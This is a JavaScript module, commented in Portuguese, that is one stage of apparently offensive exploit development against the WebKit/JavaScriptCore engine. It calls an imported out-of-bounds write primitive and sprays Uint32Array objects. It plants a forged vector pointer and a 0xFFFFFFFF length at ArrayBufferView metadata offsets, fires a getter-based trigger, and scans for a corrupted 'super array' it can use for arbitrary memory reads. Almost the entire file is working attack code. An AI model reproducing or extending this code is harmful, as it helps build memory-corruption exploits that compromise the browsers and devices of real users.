// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs'; // Adicionado OOB_CONFIG

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_SPRAY_AND_GETTER_CORRUPTION = "sprayGetterAndCheckCorruption_v14a";

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForPostCorruptionAnalysis"; // Pode ser simples
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offsets para plantar dados no oob_array_buffer_real (para a hipótese de corromper ABView)
const FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x50; 
const ADV64_ZERO = new AdvancedInt64(0, 0);
const TARGET_M_LENGTH_VALUE = 0xFFFFFFFF;

const NUM_SPRAY_OBJECTS = 200; // Ou mais, ex: 500
const ORIGINAL_SPRAY_LENGTH = 8;
const SPRAY_ELEMENT_VAL_A = 0xCCCCCCCC; // Valores diferentes do teste anterior para clareza
const SPRAY_ELEMENT_VAL_B = 0xDDDDDDDD;

// ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
let sprayedVictimObjects = [];
let originalSprayedValues = []; 
let getter_sync_flag = false;

export async function sprayAndInvestigateObjectExposure() { // Mantendo nome da exportação
    logS3(`--- Iniciando ${FNAME_SPRAY_AND_GETTER_CORRUPTION}: Spray, Trigger 0x70, Getter, Checar Corrupção Spray ---`, "test", FNAME_SPRAY_AND_GETTER_CORRUPTION);
    getter_sync_flag = false;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_SPRAY_AND_GETTER_CORRUPTION);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);

        // FASE 1: Pulverizar objetos Uint32Array e guardar seus valores originais
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        sprayedVictimObjects = [];
        originalSprayedValues = [];
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = SPRAY_ELEMENT_VAL_A;
            u32arr[1] = SPRAY_ELEMENT_VAL_B;
            for (let j = 2; j < ORIGINAL_SPRAY_LENGTH; j++) { u32arr[j] = i; }
            sprayedVictimObjects.push(u32arr);
            originalSprayedValues.push(Array.from(u32arr));
        }
        logS3("Pulverização concluída.", "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        await PAUSE_S3(50);

        // FASE 2: Plantar valores no oob_array_buffer_real para a hipótese de corromper um ABView pulverizado
        logS3(`FASE 2: Plantando m_vector=0, m_length=0xFFFFFFFF em oob_buffer para potencial corrupção de ABView...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        const targetMetaVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const targetMetaLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        
        oob_write_absolute(targetMetaVectorOffset, ADV64_ZERO, 8);
        oob_write_absolute(targetMetaLengthOffset, TARGET_M_LENGTH_VALUE, 4);
        logS3(`  Valores plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] e oob_buffer[${toHex(targetMetaLengthOffset)}]`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        
        // Adicional: Plantar algo distinto em 0x6C para ver se o getter ainda o observa como antes
        const val_for_0x6C = new AdvancedInt64(0x6C6C6C6C, 0x6C6C6C6C);
        oob_write_absolute(0x6C, val_for_0x6C, 8);
        logS3(`  Valor de teste ${val_for_0x6C.toString(true)} plantado em oob_buffer[0x6C].`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        await PAUSE_S3(50);

        // FASE 3: Configurar objeto com getter (o getter pode ser simples, apenas para sincronização ou log)
        const getterObject = {
            get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
                logS3(`    >>>> [GETTER ${GETTER_CHECKPOINT_PROPERTY_NAME} ACIONADO!] <<<<`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                getter_sync_flag = true;
                // Opcional: Ler 0x6C aqui como no teste _v13a para ver se ainda é 0xFFFFFFFF_6C6C6C6C
                try {
                    const val_0x6C_in_getter = oob_read_absolute(0x6C, 8);
                    logS3(`    [GETTER]: Valor em oob_buffer[0x6C]: ${val_0x6C_in_getter.toString(true)}`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                } catch(e) {logS3(`    [GETTER]: Erro ao ler 0x6C: ${e.message}`, "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION); }
                return "GetterSyncValue";
            }
        };

        // FASE 4: Realizar a escrita OOB (trigger)
        logS3(`FASE 4: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        await PAUSE_S3(100); 

        // FASE 5: Chamar JSON.stringify para acionar o getter (e qualquer efeito colateral da corrupção + stringify)
        logS3(`FASE 5: Chamando JSON.stringify para acionar o getter...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        try {
            JSON.stringify(getterObject);
        } catch (e) {
            logS3(`Erro durante JSON.stringify: ${e.message}`, "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        }
        if (getter_sync_flag) {
            logS3("  Getter foi acionado como esperado.", "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        } else {
            logS3("  ALERTA: Getter NÃO foi acionado!", "error", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        }
        await PAUSE_S3(100); // Pausa adicional

        // FASE 6: Verificar TODOS os arrays pulverizados por QUALQUER mudança
        logS3(`FASE 6: Verificando ${NUM_SPRAY_OBJECTS} arrays pulverizados por corrupção...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        let corruptedArraysFound = 0;
        let superArrayIndex = -1;
        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            const currentArray = sprayedVictimObjects[i];
            const originalValues = originalSprayedValues[i];
            let isCorrupted = false;
            let corruptionDetails = "";

            if (!currentArray) { // Segurança
                logS3(`Array pulverizado índice [${i}] é null/undefined.`, "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                continue;
            }

            if (currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
                isCorrupted = true;
                corruptionDetails += ` Length alterado de ${ORIGINAL_SPRAY_LENGTH} para ${currentArray.length}.`;
                if (currentArray.length === TARGET_M_LENGTH_VALUE) {
                    corruptionDetails += " (POTENCIAL SUPER ARRAY LENGTH!)";
                    superArrayIndex = i; // Marcar se encontramos o length desejado
                }
            }
            
            const checkableLength = Math.min(ORIGINAL_SPRAY_LENGTH, currentArray.length); // Evitar ler fora dos novos limites se encolher
            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) { 
                let currentValue;
                let originalValue = originalValues[j];
                if (j < currentArray.length) { // Só ler se dentro dos novos limites
                    try {
                        currentValue = currentArray[j];
                    } catch (e) {
                        isCorrupted = true;
                        corruptionDetails += ` Erro ao ler elemento [${j}]: ${e.message}.`;
                        currentValue = undefined; // Marcar como indefinido para comparação
                    }
                } else { // j está além do novo currentArray.length
                    currentValue = undefined; // Marcar como indefinido
                    if(isCorrupted && currentArray.length < ORIGINAL_SPRAY_LENGTH) { // Se o array encolheu
                         corruptionDetails += ` Elemento original [${j}] (${toHex(originalValue)}) inacessível (novo length: ${currentArray.length}).`;
                    }
                }

                if (currentValue !== originalValue) {
                     if (!(j >= currentArray.length && currentValue === undefined)) { // Não logar como mudança se apenas ficou inacessível E já logado
                        isCorrupted = true;
                        corruptionDetails += ` Elem [${j}] de ${toHex(originalValue)} para ${j < currentArray.length ? toHex(currentValue) : 'inacessível'}.`;
                     }
                }
            }
            
            if (isCorrupted) {
                logS3(`    !!! CORRUPÇÃO DETECTADA no array pulverizado índice [${i}] !!!`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                logS3(`      Detalhes: ${corruptionDetails}`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                corruptedArraysFound++;
                document.title = `CORRUPÇÃO SPRAY (${corruptedArraysFound})!`;
            }
        }

        if (corruptedArraysFound > 0) {
            logS3(`  Total de ${corruptedArraysFound} arrays pulverizados encontrados com alguma corrupção.`, "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
            if (superArrayIndex !== -1) {
                logS3(`    POTENCIAL SUPER ARRAY (pelo length) encontrado no índice: ${superArrayIndex}`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                document.title = `SUPER ARRAY? Idx ${superArrayIndex}`;
                // Tentar usar o superArray[superArrayIndex] aqui para ler 0x0 se desejar
                const sa = sprayedVictimObjects[superArrayIndex];
                try {
                    logS3(`Tentando ler superArray[${superArrayIndex}][0]: ${toHex(sa[0])}`, "leak", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                } catch (e) {
                    logS3(`Erro ao ler superArray[${superArrayIndex}][0]: ${e.message}`, "error", FNAME_SPRAY_AND_GETTER_CORRUPTION);
                }
            }
        } else {
            logS3("  Nenhuma corrupção detectada nos arrays pulverizados.", "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION);
            document.title = "Nenhuma Corrupção Spray";
        }

        logS3("INVESTIGAÇÃO DE CORRUPÇÃO EM SPRAY PÓS-GETTER CONCLUÍDA.", "test", FNAME_SPRAY_AND_GETTER_CORRUPTION);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_AND_GETTER_CORRUPTION}: ${e.message}`, "critical", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_AND_GETTER_CORRUPTION);
        document.title = `${FNAME_SPRAY_AND_GETTER_CORRUPTION} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        originalSprayedValues = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_SPRAY_AND_GETTER_CORRUPTION} Concluído ---`, "test", FNAME_SPRAY_AND_GETTER_CORRUPTION);
    }
}
